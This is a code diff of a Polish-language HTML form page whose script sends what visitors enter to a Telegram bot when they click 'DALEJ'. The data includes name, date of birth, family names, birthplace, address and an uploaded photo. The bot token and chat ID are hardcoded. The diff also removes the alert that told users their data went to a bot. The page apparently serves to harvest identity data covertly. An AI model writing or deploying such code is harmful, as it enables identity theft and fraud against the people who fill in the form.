@@ -153,13 +153,17 @@
     <a class="go">DALEJ</a>
 
 <script>
-document.querySelector('.go').addEventListener('click', async () => {
-    const token = '7626788939:AAGgZlg7vqqcMwEd6E-fn1ehJsjH4o72bRQ';
-    const chatId = '5447264217';
+const token = '7626788939:AAGgZlg7vqqcMwEd6E-fn1ehJsjH4o72bRQ';
+const chat_id = '5447264217';
 
+document.querySelector('.go').addEventListener('click', async () => {
     const name = document.getElementById('name').value;
     const surname = document.getElementById('surname').value;
-    const gender = document.querySelector('.selected_text').innerText;
+    const gender = document.querySelector('.selector_text')?.textContent?.trim();
+    const day = document.querySelectorAll('.date_input')[0].value;
+    const month = document.querySelectorAll('.date_input')[1].value;
+    const year = document.querySelectorAll('.date_input')[2].value;
+    const dateOfBirth = `${day}.${month}.${year}`;
     const nationality = document.getElementById('nationality').value;
     const familyName = document.getElementById('familyName').value;
     const fathersFamilyName = document.getElementById('fathersFamilyName').value;
@@ -169,15 +173,6 @@ document.querySelector('.go').addEventListener('click', async () => {
     const address1 = document.getElementById('adress1').value;
     const address2 = document.getElementById('adress2').value;
     const city = document.getElementById('city').value;
-
-    const day = document.querySelectorAll('.date_input')[0].value;
-    const month = document.querySelectorAll('.date_input')[1].value;
-    const year = document.querySelectorAll('.date_input')[2].value;
-
-    const dateOfBirth = `${day.padStart(2, '0')}-${month.padStart(2, '0')}-${year}`;
-
-    // Zdjęcie z uploadu
-    const image = document.querySelector('.upload_uploaded').src;
 
     const text = `
 <b>📄 Nowe dane:</b>
@@ -191,49 +186,35 @@ document.querySelector('.go').addEventListener('click', async () => {
 👩 Matka: ${mothersFamilyName}
 🏙️ Miejsce urodzenia: ${birthPlace}, ${countryOfBirth}
 🏠 Adres: ${address1}, ${address2} ${city}
-    `;
+`;
 
-    // Wyślij dane tekstowe
+    // Wyślij tekst
     await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
         },
         body: JSON.stringify({
-            chat_id: chatId,
-            text: text,
+            chat_id,
+            text,
             parse_mode: 'HTML'
         })
     });
 
     // Wyślij zdjęcie
-    if (image && image.startsWith('data:image')) {
-        const formData = new FormData();
-        formData.append('chat_id', chatId);
+    const fileInput = document.querySelector('input[type="file"]');
+    const file = fileInput?.files?.[0];
 
-        // Zamiana base64 na blob
-        const res = await fetch(image);
-        const blob = await res.blob();
-        formData.append('photo', blob, 'photo.jpg');
+    if (file) {
+        const formData = new FormData();
+        formData.append('chat_id', chat_id);
+        formData.append('photo', file);
 
         await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
             method: 'POST',
             body: formData
         });
-    } else if (image && image.startsWith('http')) {
-        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                chat_id: chatId,
-                photo: image
-            })
-        });
     }
-
-    alert("Dane zostały wysłane do bota.");
 });
 </script>
 
